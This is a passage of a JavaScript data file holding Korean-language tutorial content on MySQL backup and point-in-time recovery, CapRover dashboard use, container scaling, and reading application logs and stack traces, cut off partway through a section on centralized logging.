// Tier 1-1: 백업 & 복구 시스템 - Content 데이터
const tier1_1_content = {
  beginner: {
    title: "초급: 백업이 왜 필요한지 이해하고 수동 백업하기",
    sections: [
      {
        heading: "📚 학습 목표",
        content: "데이터베이스 백업의 개념과 필요성을 이해하고, mysqldump를 사용하여 수동 백업을 실행할 수 있다."
      },
      {
        heading: "1. 백업이란 무엇인가?",
        content: "백업은 데이터베이스의 현재 상태를 파일로 저장하는 작업입니다. 서버 장애, 실수로 인한 삭제, 해킹 등의 상황에서 데이터를 복구하기 위한 필수 작업입니다.",
        list: [
          "사용자가 실수로 DELETE FROM users; 실행 → 모든 회원 데이터 삭제",
          "서버 디스크 고장 → 모든 데이터 영구 손실",
          "랜섬웨어 공격 → 데이터 암호화되어 접근 불가"
        ]
      },
      {
        heading: "2. mysqldump 기본 사용법",
        code: `# CapRover에서 MySQL 컨테이너에 접속
docker exec -it $(docker ps | grep mysql | awk '{print $1}') bash

# 전체 데이터베이스 백업
mysqldump -u root -p'비밀번호' --all-databases > /backup/full_backup_$(date +%Y%m%d).sql

# 특정 데이터베이스만 백업
mysqldump -u root -p'비밀번호' cms_database > /backup/cms_backup.sql

# 백업 파일을 호스트로 복사
docker cp mysql_container:/backup/cms_backup.sql ./backups/`
      },
      {
        heading: "3. 백업 파일 확인하기",
        content: "백업 파일은 SQL 문으로 이루어진 텍스트 파일입니다:",
        code: `head -20 cms_backup.sql
# 출력 예시:
# -- MySQL dump 10.13
# CREATE TABLE users (
#   id int PRIMARY KEY,
#   username varchar(50),
#   ...
# );
# INSERT INTO users VALUES (1, 'admin', ...);`
      },
      {
        heading: "4. 실습: 첫 백업 실행하기",
        steps: [
          { label: "Step 1", text: "CapRover 대시보드 → Apps → MySQL → 터미널 접속" },
          { label: "Step 2", text: "백업 디렉토리 생성", code: "mkdir -p /backup" },
          { label: "Step 3", text: "백업 실행", code: "mysqldump -u root -p$MYSQL_ROOT_PASSWORD cms_database > /backup/my_first_backup.sql" },
          { label: "Step 4", text: "백업 확인", code: `ls -lh /backup/\n# 출력: -rw-r--r-- 1 mysql mysql 15M Jan 15 10:30 my_first_backup.sql`, note: "파일 크기가 0보다 크면 성공!" }
        ]
      },
      {
        heading: "5. 백업 파일 보관하기",
        content: "백업 파일은 데이터베이스 서버와 다른 장소에 보관해야 합니다:",
        list: [
          "로컬 컴퓨터에 다운로드",
          "클라우드 스토리지 (Google Drive, AWS S3)",
          "외부 서버"
        ],
        code: `# CapRover 호스트에서 실행\ndocker cp $(docker ps | grep mysql | awk '{print $1}'):/backup/my_first_backup.sql ~/safe_location/`
      },
      {
        heading: "⚠️ 주의사항",
        list: [
          "백업 파일에는 비밀번호 등 민감정보가 포함되어 있습니다",
          "백업 파일 권한을 600으로 제한: chmod 600 backup.sql",
          "정기적으로 백업 파일이 복구 가능한지 테스트하세요"
        ]
      },
      {
        heading: "✅ 체크리스트",
        checklist: [
          "mysqldump 명령어로 백업 실행 성공",
          "백업 파일 크기 확인 (0보다 커야 함)",
          "백업 파일을 안전한 장소에 복사",
          "백업 파일을 텍스트 에디터로 열어 내용 확인"
        ],
        nextStep: "이 백업을 실제로 복구하는 방법을 배우고, 백업을 자동화하는 방법을 익힙니다."
      }
    ]
  },
  intermediate: {
    title: "중급: 백업 자동화하고 복구 시나리오 대비하기",
    sections: [
      {
        heading: "📚 학습 목표",
        content: "Cron을 사용하여 백업을 자동화하고, 다양한 복구 시나리오에 대비할 수 있다."
      },
      {
        heading: "1. 백업 자동화가 필요한 이유",
        content: "수동 백업의 문제점:",
        list: [
          "깜빡하고 잊어버림 → 장애 발생 시 복구 불가",
          "백업 주기가 불규칙 → 최신 데이터 손실 위험",
          "사람이 직접 해야 함 → 시간 낭비"
        ]
      },
      {
        heading: "2. 백업 스크립트 작성",
        code: `#!/bin/bash
# /backup/mysql_backup.sh

DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/backup"
DB_NAME="cms_database"
KEEP_DAYS=7

# 백업 실행
mysqldump -u root -p$MYSQL_ROOT_PASSWORD \
  --single-transaction \
  --routines \
  --triggers \
  $DB_NAME > $BACKUP_DIR/backup_$DATE.sql

# 압축하여 공간 절약
gzip $BACKUP_DIR/backup_$DATE.sql

# 7일 이상 된 백업 삭제
find $BACKUP_DIR -name "backup_*.sql.gz" -mtime +$KEEP_DAYS -delete

echo "Backup completed: backup_$DATE.sql.gz"`
      },
      {
        heading: "3. Cron 설정하기",
        steps: [
          { label: "Step 1", text: "스크립트 실행 권한 부여", code: "chmod +x /backup/mysql_backup.sh" },
          { label: "Step 2", text: "Cron 편집기 열기", code: "crontab -e" },
          { label: "Step 3", text: "매일 새벽 2시에 백업 실행", code: "0 2 * * * /backup/mysql_backup.sh >> /var/log/backup.log 2>&1" },
          { label: "Step 4", text: "Cron 작업 확인", code: "crontab -l" }
        ]
      },
      {
        heading: "4. 복구 테스트",
        content: "백업은 복구할 수 있어야 의미가 있습니다. 반드시 테스트하세요!",
        steps: [
          { label: "테스트 DB 생성", code: "mysql -u root -p -e 'CREATE DATABASE test_restore;'" },
          { label: "백업 파일 복구", code: "gunzip < backup_20250104_020001.sql.gz | mysql -u root -p test_restore" },
          { label: "데이터 확인", code: "mysql -u root -p test_restore -e 'SHOW TABLES;'" },
          { label: "테스트 DB 삭제", code: "mysql -u root -p -e 'DROP DATABASE test_restore;'" }
        ]
      },
      {
        heading: "✅ 자동화 체크리스트",
        checklist: [
          "백업 스크립트가 정상 실행되는가?",
          "Cron이 설정된 시간에 작동하는가?",
          "오래된 백업이 자동 삭제되는가?",
          "복구 테스트가 성공했는가?"
        ]
      }
    ]
  },
  advanced: {
    title: "고급: 증분 백업과 Point-in-Time 복구",
    sections: [
      {
        heading: "📚 학습 목표",
        content: "Binary Log를 활용한 증분 백업과 특정 시점으로 복구하는 방법을 익힙니다."
      },
      {
        heading: "1. Binary Log란?",
        content: "MySQL의 모든 데이터 변경 사항(INSERT, UPDATE, DELETE)을 기록하는 로그입니다. 이를 활용하면:",
        list: [
          "전체 백업 + Binary Log = 어떤 시점으로든 복구 가능",
          "디스크 공간 절약 (전체 백업은 하루 1회, 증분은 계속)",
          "사용자가 실수한 직전 시점으로 복구"
        ]
      },
      {
        heading: "2. Binary Log 활성화",
        content: "CapRover MySQL 컨테이너의 my.cnf 설정:",
        code: `[mysqld]
server-id = 1
log_bin = /var/log/mysql/mysql-bin.log
expire_logs_days = 7
max_binlog_size = 100M

# 컨테이너 재시작 필요
docker restart $(docker ps | grep mysql | awk '{print $1}')`
      },
      {
        heading: "3. Point-in-Time 복구 시나리오",
        content: "예시: 오후 3시에 실수로 DELETE 쿼리 실행, 마지막 전체 백업은 새벽 2시",
        steps: [
          {
            label: "Step 1",
            text: "새벽 2시 전체 백업 복구",
            code: "mysql -u root -p cms_database < backup_20250104_020000.sql"
          },
          {
            label: "Step 2",
            text: "Binary Log에서 2시~3시 사이의 변경사항 추출",
            code: "mysqlbinlog --start-datetime='2025-01-04 02:00:00' \\\n  --stop-datetime='2025-01-04 14:59:59' \\\n  /var/log/mysql/mysql-bin.000001 > incremental.sql"
          },
          {
            label: "Step 3",
            text: "증분 복구 적용",
            code: "mysql -u root -p cms_database < incremental.sql"
          },
          {
            label: "결과",
            text: "오후 3시 직전 상태로 완벽 복구!"
          }
        ]
      },
      {
        heading: "4. 실전 복구 플레이북",
        content: "긴급 상황 대응 절차:",
        checklist: [
          "즉시 서비스 중지 (추가 손상 방지)",
          "현재 데이터베이스 전체 덤프 (현재 상태 보존)",
          "가장 최근 전체 백업 확인",
          "Binary Log 위치 확인",
          "테스트 환경에서 복구 시뮬레이션",
          "성공 확인 후 프로덕션 복구",
          "서비스 재개 및 데이터 검증"
        ]
      },
      {
        heading: "5. 고급 백업 전략",
        list: [
          "3-2-1 규칙: 3개 복사본, 2개 다른 미디어, 1개 오프사이트",
          "핫 백업(실시간) vs 콜드 백업(서비스 중지)",
          "레플리카 서버 활용 (읽기 부하 분산 + 백업 소스)",
          "클라우드 백업 자동화 (AWS S3, Google Cloud Storage)"
        ]
      },
      {
        heading: "⚡ 고급 실습 과제",
        checklist: [
          "Binary Log를 활성화하고 5분 후 특정 레코드 삭제 후 복구",
          "백업 파일을 S3에 자동 업로드하는 스크립트 작성",
          "복구 시간 목표(RTO) 1시간 이내 달성 가능한지 테스트",
          "재해 복구 문서(Disaster Recovery Plan) 작성"
        ]
      }
    ]
  }
};

// 전체 프레임워크 데이터
export const frameworkData = {
  tiers: [
    {
      id: 'tier1',
      name: 'Tier 1: 긴급 생존 기술',
      period: '1~2주, 필수',
      color: 'bg-red-100 border-red-300 text-red-800',
      reason: '서비스가 다운되거나 데이터가 날아갔을 때 복구하기 위해',
      topics: [
        {
          id: '1-1',
          name: '백업 & 복구 시스템',
          goal: '데이터를 안전하게 보관하고 문제 시 복구할 수 있다',
          hours: 5,
          keywords: ['mysqldump', 'mysql import', 'cron', 'backup strategy'],
          tasks: [
            'MySQL 수동 백업 3회 실행',
            '백업 파일로 테스트 DB 복구',
            '자동 백업 스크립트 작성 및 테스트'
          ],
          content: tier1_1_content
        },
        {
          id: '1-2',
          name: 'CapRover 대시보드 마스터',
          goal: 'CapRover를 통해 시스템 상태를 파악하고 기본 조치를 할 수 있다',
          hours: 3,
          keywords: ['CapRover', 'Docker container', 'application monitoring'],
          tasks: [
            '각 앱의 로그 10분씩 관찰',
            '의도적으로 앱 중지 후 재시작',
            '환경변수 하나 변경하고 재배포'
          ],
          content: {
            beginner: {
              title: "초급: CapRover 인터페이스 익히기",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "CapRover 대시보드의 주요 메뉴를 이해하고, 앱의 상태를 파악할 수 있다."
                },
                {
                  heading: "1. CapRover란?",
                  content: "CapRover는 Docker 기반의 오픈소스 PaaS(Platform as a Service)입니다. Heroku처럼 쉽게 앱을 배포하지만, 자신의 서버에서 완전한 제어권을 갖습니다.",
                  list: [
                    "무료 오픈소스 (Heroku는 유료)",
                    "Git push만으로 자동 배포",
                    "무중단 배포, SSL 인증서 자동 발급",
                    "하나의 서버에서 여러 앱 관리"
                  ]
                },
                {
                  heading: "2. 대시보드 주요 메뉴 둘러보기",
                  steps: [
                    {
                      label: "Apps",
                      text: "배포된 앱 목록 (MySQL, Redis, PHP 백엔드, React 프론트엔드 등)"
                    },
                    {
                      label: "Monitoring",
                      text: "NetData 연동 - CPU, 메모리, 디스크, 네트워크 실시간 그래프"
                    },
                    {
                      label: "Cluster",
                      text: "서버(노드) 관리 - 여러 서버를 클러스터로 묶을 수 있음"
                    },
                    {
                      label: "Settings",
                      text: "시스템 설정 - 도메인, SSL, 비밀번호 변경 등"
                    }
                  ]
                },
                {
                  heading: "3. 앱 상태 확인하기",
                  content: "Apps 메뉴에서 각 앱의 상태를 확인할 수 있습니다:",
                  list: [
                    "초록불: 정상 실행 중 (Running)",
                    "회색: 중지됨 (Stopped)",
                    "빨강: 에러 발생 (Error/Crashed)"
                  ],
                  code: `# 앱을 클릭하면 볼 수 있는 정보:
- Instance Count: 실행 중인 컨테이너 수
- Memory Limit: 메모리 제한 (기본 512MB)
- Port Mapping: 포트 설정
- Environment Variables: 환경 변수 (DB 비밀번호 등)
- Logs: 최근 로그 100줄`
                },
                {
                  heading: "4. 실습: 앱 로그 10분간 관찰하기",
                  steps: [
                    {
                      label: "Step 1",
                      text: "Apps → MySQL 앱 클릭"
                    },
                    {
                      label: "Step 2",
                      text: "App Logs 탭으로 이동"
                    },
                    {
                      label: "Step 3",
                      text: "Auto Refresh 활성화 (우측 상단 토글)"
                    },
                    {
                      label: "관찰 포인트",
                      text: "어떤 쿼리가 실행되는가? 에러 메시지는 없는가?"
                    }
                  ]
                },
                {
                  heading: "5. HTTP Settings 이해하기",
                  content: "각 앱의 HTTP Settings에서 도메인과 SSL을 설정합니다:",
                  code: `# 예시:
- Enable HTTPS: 체크 (Let's Encrypt 자동 SSL)
- Container HTTP Port: 80 (앱이 리스닝하는 포트)
- Force HTTPS: 체크 (HTTP → HTTPS 리다이렉트)
- Custom Domain: cms.example.com`
                },
                {
                  heading: "✅ 초급 체크리스트",
                  checklist: [
                    "각 앱의 상태(초록/회색/빨강) 확인",
                    "MySQL, Redis, 백엔드, 프론트엔드 로그를 각각 10분씩 관찰",
                    "앱 하나의 Environment Variables 확인",
                    "Monitoring 메뉴에서 CPU/메모리 그래프 확인"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 컨테이너 라이프사이클과 문제 해결",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "컨테이너를 중지/재시작하고, 환경변수를 변경하여 앱 동작을 제어할 수 있다."
                },
                {
                  heading: "1. 컨테이너 라이프사이클",
                  content: "컨테이너는 생명주기를 가진 프로세스입니다:",
                  list: [
                    "Created: 이미지로부터 생성됨",
                    "Running: 실행 중 (앱이 작동하는 상태)",
                    "Stopped: 중지됨 (데이터는 보존)",
                    "Restarting: 재시작 중",
                    "Dead: 비정상 종료"
                  ]
                },
                {
                  heading: "2. 실습: 의도적으로 앱 중지 후 재시작",
                  steps: [
                    {
                      label: "Step 1",
                      text: "테스트용 앱 선택 (프론트엔드 추천)",
                      code: "Apps → React 앱 클릭"
                    },
                    {
                      label: "Step 2",
                      text: "앱 중지하기",
                      code: "우측 상단 ... 메뉴 → Stop"
                    },
                    {
                      label: "Step 3",
                      text: "브라우저에서 사이트 접속 → 502 Bad Gateway 확인"
                    },
                    {
                      label: "Step 4",
                      text: "앱 재시작",
                      code: "... 메뉴 → Start"
                    },
                    {
                      label: "Step 5",
                      text: "30초 대기 후 사이트 정상 작동 확인"
                    }
                  ]
                },
                {
                  heading: "3. 환경변수 변경하기",
                  content: "환경변수는 앱의 설정값입니다 (DB 주소, API 키 등). 변경 시 재배포가 필요합니다.",
                  steps: [
                    {
                      label: "예시",
                      text: "백엔드 앱의 디버그 모드 활성화",
                      code: `# App Config 탭 → Environment Variables
KEY: DEBUG
VALUE: true

# Save & Update 클릭 → 자동 재배포 시작`
                    }
                  ]
                },
                {
                  heading: "4. 로그로 문제 진단하기",
                  content: "앱이 제대로 시작하지 않을 때:",
                  list: [
                    "App Logs에서 에러 메시지 확인",
                    "환경변수 오타 확인 (DB_HOST vs DATABASE_HOST)",
                    "포트 충돌 확인 (같은 포트를 2개 앱이 사용)",
                    "메모리 부족 (앱이 반복적으로 재시작)"
                  ],
                  code: `# 흔한 에러 예시
Error: connect ECONNREFUSED 127.0.0.1:3306
→ MySQL이 중지되었거나 연결 정보가 틀림

FATAL: could not allocate memory
→ 메모리 제한 초과, App Config에서 메모리 증가 필요`
                }
                ,
                {
                  heading: "5. 재배포(Redeploy) 이해하기",
                  content: "다음 경우에 재배포가 필요합니다:",
                  list: [
                    "환경변수 변경",
                    "코드 업데이트 (Git push)",
                    "컨테이너 설정 변경 (메모리, 포트 등)"
                  ],
                  code: `# 재배포 과정:
1. 새 컨테이너 생성 (새로운 설정 적용)
2. 헬스체크 통과 확인
3. 기존 컨테이너 트래픽 차단
4. 새 컨테이너로 트래픽 전환
5. 기존 컨테이너 종료

→ 무중단 배포(Zero Downtime Deployment)`
                },
                {
                  heading: "✅ 중급 체크리스트",
                  checklist: [
                    "앱 중지 → 재시작 성공",
                    "환경변수 하나 변경 후 재배포 성공",
                    "로그에서 에러 메시지 찾아 해석",
                    "재배포 과정에서 사이트 접속 테스트 (무중단 확인)"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: 무중단 배포와 스케일링",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "앱을 스케일 아웃하여 트래픽을 분산하고, 무중단 배포를 완벽히 이해한다."
                },
                {
                  heading: "1. 스케일링이란?",
                  content: "트래픽이 증가하면 서버를 확장해야 합니다:",
                  list: [
                    "Scale Up (수직 확장): 서버의 CPU/메모리 증가",
                    "Scale Out (수평 확장): 같은 앱의 컨테이너를 여러 개 실행"
                  ],
                  code: `# CapRover는 Scale Out을 쉽게 지원
App Config → Instance Count: 3
→ 같은 앱이 3개 컨테이너로 실행
→ 트래픽은 자동으로 로드밸런싱`
                },
                {
                  heading: "2. 실습: 앱 스케일 아웃",
                  steps: [
                    {
                      label: "Step 1",
                      text: "백엔드 앱의 Instance Count를 3으로 변경"
                    },
                    {
                      label: "Step 2",
                      text: "Save & Update → 3개 컨테이너 생성 확인"
                    },
                    {
                      label: "Step 3",
                      text: "Monitoring에서 메모리 사용량 증가 확인"
                    },
                    {
                      label: "Step 4",
                      text: "로그에서 3개 컨테이너의 다른 로그 확인",
                      note: "요청이 각 컨테이너에 분산됨"
                    }
                  ]
                },
                {
                  heading: "3. 로드밸런싱 전략",
                  content: "CapRover는 Nginx로 로드밸런싱을 수행합니다:",
                  list: [
                    "Round Robin: 순서대로 요청 분배 (기본값)",
                    "Least Connections: 연결이 적은 컨테이너 우선",
                    "IP Hash: 같은 IP는 같은 컨테이너로 (세션 유지)"
                  ],
                  code: `# 고급 설정 (Nginx Config Override)
upstream backend {
  least_conn;
  server container1:3000;
  server container2:3000;
  server container3:3000;
}`
                },
                {
                  heading: "4. 헬스체크와 자동 복구",
                  content: "CapRover는 컨테이너 상태를 주기적으로 확인합니다:",
                  code: `# App Config → Health Check Path
/health

# 백엔드에서 헬스체크 엔드포인트 구현
GET /health
Response: { "status": "ok", "timestamp": 1234567890 }

# 헬스체크 실패 시:
1. 해당 컨테이너로 트래픽 차단
2. 3번 재시도
3. 여전히 실패하면 컨테이너 재시작`
                },
                {
                  heading: "5. 무중단 배포 심화",
                  content: "배포 시 다운타임을 0으로 만드는 전략:",
                  steps: [
                    {
                      label: "Blue-Green 배포",
                      text: "기존(Blue)과 새(Green) 환경을 동시 운영 → 전환",
                      note: "CapRover는 자동으로 Blue-Green 배포 수행"
                    },
                    {
                      label: "Rolling 배포",
                      text: "인스턴스를 하나씩 순차적으로 업데이트",
                      code: "Instance Count: 3\n1번 업데이트 → 2, 3번으로 트래픽\n2번 업데이트 → 1, 3번으로 트래픽\n3번 업데이트 → 1, 2번으로 트래픽"
                    }
                  ]
                },
                {
                  heading: "6. 리소스 제한과 모니터링",
                  content: "컨테이너가 과도한 리소스를 사용하지 않도록 제한:",
                  code: `# App Config → Advanced Settings
Memory Limit: 512MB (기본값)
CPU Shares: 1024 (상대적 비율)

# 메모리 초과 시:
- OOMKilled (Out Of Memory Killed)
- 컨테이너 강제 종료 → 자동 재시작
- 로그: FATAL: could not allocate memory`
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "백엔드 앱을 3개 인스턴스로 스케일 아웃",
                    "부하 테스트 도구(Apache Bench)로 100 req/s 전송하여 로드밸런싱 확인",
                    "헬스체크 엔드포인트 구현 및 테스트",
                    "의도적으로 하나의 컨테이너를 중지하고 트래픽이 다른 컨테이너로 이동하는지 확인",
                    "배포 시 다운타임 0초 달성 (브라우저 자동 새로고침 스크립트로 테스트)"
                  ]
                }
              ]
            }
          }
        },
        {
          id: '1-3',
          name: '로그 읽기와 에러 해석',
          goal: '에러 로그를 보고 문제의 원인을 파악할 수 있다',
          hours: 4,
          keywords: ['log analysis', 'error debugging', 'stack trace'],
          tasks: [
            '각 서비스(MySQL, Redis, PHP, React) 로그 형식 파악',
            '의도적으로 에러 발생시키고 로그 분석',
            'AI에게 에러 해결 질문 3회'
          ],
          content: {
            beginner: {
              title: "초급: 로그의 기본 개념과 읽는 법",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "로그가 무엇인지 이해하고, 각 서비스(MySQL, Redis, PHP, React)의 로그를 읽을 수 있다."
                },
                {
                  heading: "1. 로그란 무엇인가?",
                  content: "로그는 프로그램이 실행되면서 남기는 기록입니다. 일기장처럼 '언제, 무엇을, 어떻게' 했는지 기록합니다.",
                  list: [
                    "정상 작동 로그: 사용자 로그인, 파일 업로드 성공 등",
                    "경고(Warning): 문제는 아니지만 주의가 필요한 상황",
                    "에러(Error): 요청 실패, 연결 오류 등",
                    "크리티컬(Critical): 서비스 중단급 심각한 문제"
                  ]
                },
                {
                  heading: "2. 로그 레벨 이해하기",
                  code: `# 로그 레벨 (심각도 순서)
DEBUG    → 개발자용 상세 정보
INFO     → 일반 정보 (사용자 로그인, API 호출)
WARNING  → 경고 (디스크 80% 사용, 느린 쿼리)
ERROR    → 오류 (DB 연결 실패, 파일 없음)
CRITICAL → 치명적 (서비스 중단, 메모리 고갈)

# 운영 환경에서는 보통 INFO 이상만 기록
# 개발 환경에서는 DEBUG까지 모두 기록`
                },
                {
                  heading: "3. MySQL 로그 읽기",
                  content: "CapRover의 MySQL 앱 로그에서 볼 수 있는 내용:",
                  code: `# 정상 작동
2025-01-04T10:30:15.123Z [Note] Server socket created on IP: '0.0.0.0'.
2025-01-04T10:30:16.456Z [Note] mysqld: ready for connections.

# 새 연결
2025-01-04T10:35:20.789Z [Note] Access granted for user 'cms_user'@'172.17.0.5'

# 슬로우 쿼리 경고
2025-01-04T10:40:00.123Z [Warning] Query took 5.2 seconds: SELECT * FROM posts WHERE ...

# 에러
2025-01-04T10:45:30.456Z [ERROR] Access denied for user 'wrong_user'@'172.17.0.5'`
                },
                {
                  heading: "4. Redis 로그 읽기",
                  code: `# Redis 시작
1:M 04 Jan 2025 10:30:00.123 * Server initialized
1:M 04 Jan 2025 10:30:00.456 * Ready to accept connections

# 명령 실행 (DEBUG 모드)
1:M 04 Jan 2025 10:35:15.789 "GET" "session:user123"
1:M 04 Jan 2025 10:35:16.012 "SET" "session:user123" "..."

# 메모리 경고
1:M 04 Jan 2025 10:40:00.123 # WARNING: Memory usage is 80%

# 에러
1:M 04 Jan 2025 10:45:00.456 # ERROR: Out of memory`
                },
                {
                  heading: "5. 백엔드(PHP/Node.js) 로그 읽기",
                  code: `# PHP 로그 예시
[2025-01-04 10:30:15] INFO: User login successful (user_id: 123)
[2025-01-04 10:35:20] WARNING: Deprecated function called in /app/old_code.php:45
[2025-01-04 10:40:00] ERROR: Database connection failed: SQLSTATE[HY000] [2002] Connection refused

# Node.js 로그 예시
2025-01-04T10:30:15.123Z INFO  User authenticated: user123
2025-01-04T10:35:20.456Z WARN  API rate limit approaching (95/100)
2025-01-04T10:40:00.789Z ERROR Unable to fetch data from external API: ETIMEDOUT`
                },
                {
                  heading: "6. 프론트엔드(React) 로그 읽기",
                  content: "브라우저 콘솔과 서버 로그를 함께 봐야 합니다:",
                  code: `# Vite 개발 서버 로그
10:30:15 AM [vite] page reload src/App.jsx
10:35:20 AM [vite] hmr update /src/components/Header.jsx

# 빌드 에러
10:40:00 AM [vite] Internal server error: Failed to parse source
  SyntaxError: Unexpected token '<' (12:5)

# 브라우저 콘솔 (개발자 도구 F12)
GET http://api.example.com/users 404 Not Found
Uncaught TypeError: Cannot read property 'map' of undefined`
                },
                {
                  heading: "✅ 초급 실습",
                  checklist: [
                    "CapRover에서 MySQL 로그를 10분간 관찰하고 3가지 유형의 로그 찾기",
                    "Redis 로그에서 메모리 사용량 관련 메시지 찾기",
                    "백엔드 로그에서 ERROR 레벨 메시지 1개 찾아 해석하기",
                    "브라우저 콘솔에서 404 에러 재현하고 원인 파악하기"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 스택 트레이스 읽기와 에러 추적",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "스택 트레이스를 읽고 에러가 발생한 정확한 위치와 원인을 파악할 수 있다."
                },
                {
                  heading: "1. 스택 트레이스란?",
                  content: "에러가 발생했을 때 함수 호출 경로를 역순으로 보여주는 로그입니다. '범인 추적'과 같습니다.",
                  code: `# 예시: PHP 스택 트레이스
Fatal error: Uncaught Error: Call to undefined function connectDB()
Stack trace:
#0 /app/services/UserService.php(25): DatabaseHelper->query('SELECT * FROM...')
#1 /app/controllers/UserController.php(15): UserService->getUser(123)
#2 /app/routes.php(8): UserController->show()
#3 /app/index.php(30): handleRequest()

읽는 순서:
- 맨 위가 에러 발생 지점 (connectDB 함수가 없음)
- #0부터 역순으로 읽으면 호출 경로를 알 수 있음
- #0 → #1 → #2 → #3 순서로 함수가 호출됨`
                },
                {
                  heading: "2. 실전 에러 분석 예시 1: DB 연결 오류",
                  code: `# 로그
[2025-01-04 14:30:00] ERROR: SQLSTATE[HY000] [2002] Connection refused
  at PDO->__construct() in /app/database/Connection.php:15
  at Connection::connect() in /app/services/PostService.php:10
  at PostService->getAllPosts() in /app/controllers/PostController.php:20

분석:
1. Connection refused → MySQL이 중지되었거나 주소가 틀림
2. Connection.php:15 → DB 연결 설정 확인
3. 해결: CapRover에서 MySQL 앱이 Running 상태인지 확인`
                },
                {
                  heading: "3. 실전 에러 분석 예시 2: Null Pointer",
                  code: `# Node.js 에러
TypeError: Cannot read property 'username' of null
    at formatUser (/app/utils/format.js:12:20)
    at /app/routes/api.js:45:18
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)

분석:
1. format.js:12번째 줄에서 null.username 접근 시도
2. api.js:45에서 formatUser()를 호출했지만 null을 전달
3. 해결:
   - format.js에 null 체크 추가
   - 또는 api.js에서 호출 전 검증

수정 코드:
function formatUser(user) {
  if (!user) return { username: 'Guest' };  // null 체크 추가
  return { username: user.username };
}`
                },
                {
                  heading: "4. 의도적으로 에러 발생시켜 로그 분석하기",
                  content: "학습을 위해 일부러 에러를 만들어봅시다:",
                  steps: [
                    {
                      label: "시나리오 1",
                      text: "MySQL 앱 중지 → 백엔드 로그에서 DB 연결 에러 확인",
                      code: "CapRover → MySQL → Stop\n백엔드 로그: ECONNREFUSED 127.0.0.1:3306"
                    },
                    {
                      label: "시나리오 2",
                      text: "환경변수 잘못 설정 → 설정 에러 확인",
                      code: "DB_HOST를 'wrong-host'로 변경 → 재배포\n로그: getaddrinfo ENOTFOUND wrong-host"
                    },
                    {
                      label: "시나리오 3",
                      text: "API 엔드포인트 오타 → 404 에러",
                      code: "GET /api/usres (오타) → 404 Not Found\n로그: No route found for GET /api/usres"
                    }
                  ]
                },
                {
                  heading: "5. 에러 로그에서 해결 힌트 찾기",
                  content: "좋은 에러 메시지는 해결 방법을 알려줍니다:",
                  list: [
                    "Connection refused → 서비스가 꺼져있거나 방화벽 문제",
                    "ENOENT: no such file → 파일 경로 확인",
                    "Syntax Error → 코드 문법 오류, 해당 줄 확인",
                    "Port 3000 already in use → 다른 프로세스가 포트 사용 중",
                    "Out of memory → 메모리 부족, 컨테이너 제한 증가 필요"
                  ]
                },
                {
                  heading: "6. AI에게 에러 해결 질문하는 법",
                  code: `# 나쁜 질문
"에러가 나요"

# 좋은 질문
"CapRover에서 Node.js 백엔드를 배포했는데 다음 에러가 발생합니다:

Error: connect ECONNREFUSED 127.0.0.1:3306
    at TCPConnectWrap.afterConnect [as oncomplete] (net.js:1148:16)

환경:
- Node.js 18, Express
- MySQL은 같은 CapRover에서 실행 중
- DB_HOST 환경변수: srv-captain--mysql

어떻게 해결하나요?"

→ AI가 정확한 답변 제공: "127.0.0.1이 아니라 srv-captain--mysql:3306으로 연결해야 합니다"`
                },
                {
                  heading: "✅ 중급 실습",
                  checklist: [
                    "각 서비스(MySQL, Redis, 백엔드)에서 의도적으로 에러 발생시키기",
                    "스택 트레이스를 읽고 에러 발생 파일과 줄 번호 찾기",
                    "AI(ChatGPT, Claude)에게 에러 로그를 제시하고 해결 방법 3가지 질문하기",
                    "에러를 수정하고 로그에서 정상 작동 확인"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: 구조화된 로깅과 AI 활용 디버깅",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "구조화된 로그를 설계하고, 로그 분석 도구 및 AI를 활용하여 효율적으로 디버깅한다."
                },
                {
                  heading: "1. 구조화된 로깅이란?",
                  content: "단순 텍스트 대신 JSON 형식으로 로그를 기록하면 검색과 분석이 쉬워집니다.",
                  code: `# 기존 로그 (비구조화)
2025-01-04 10:30:15 User john logged in from 192.168.1.100

# 구조화된 로그 (JSON)
{
  "timestamp": "2025-01-04T10:30:15.123Z",
  "level": "INFO",
  "event": "user_login",
  "user_id": 123,
  "username": "john",
  "ip": "192.168.1.100",
  "user_agent": "Mozilla/5.0..."
}

장점:
- 특정 사용자의 모든 활동 검색 가능
- IP별 로그인 빈도 분석
- 자동화된 알림 (예: 같은 IP에서 10번 실패 시)`
                },
                {
                  heading: "2. Winston으로 구조화된 로깅 구현 (Node.js)",
                  code: `// npm install winston
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// 사용
logger.info('User login', {
  user_id: 123,
  username: 'john',
  ip: req.ip
});

logger.error('Database query failed', {
  query: 'SELECT * FROM users',
  error: err.message,
  duration_ms: 1234
});`
                },
                {
                  heading: "3. 로그 쿼리와 분석",
                  content: "JSON 로그는 jq 명령어로 쉽게 필터링할 수 있습니다:",
                  code: `# 특정 사용자의 모든 활동
cat combined.log | jq 'select(.user_id == 123)'

# 에러만 필터링
cat combined.log | jq 'select(.level == "ERROR")'

# 느린 쿼리 찾기 (5초 이상)
cat combined.log | jq 'select(.duration_ms > 5000)'

# 시간대별 에러 카운트
cat combined.log | jq -r 'select(.level == "ERROR") | .timestamp' | cut -d'T' -f1 | sort | uniq -c`
                },
                {
                  heading: "4. 중앙 집중식 로깅 (ELK Stack 개념)",
                  content: "여러 서버의 로그를 한 곳에서 보는 방법:",
                  list: [
                    "Elasticsearch: 로그 저장 및 검색",
                    "Logstash: 로그 수집 및 변환",
                    "Kibana: 시각화 대시보드"
                  ],
                  code: `# 간단한 대안: Grafana Loki (무료)
# CapRover에 Loki 설치 가능
# 모든 컨테이너 로그 자동 수집
# 웹 UI에서 실시간 검색

예시 쿼리:
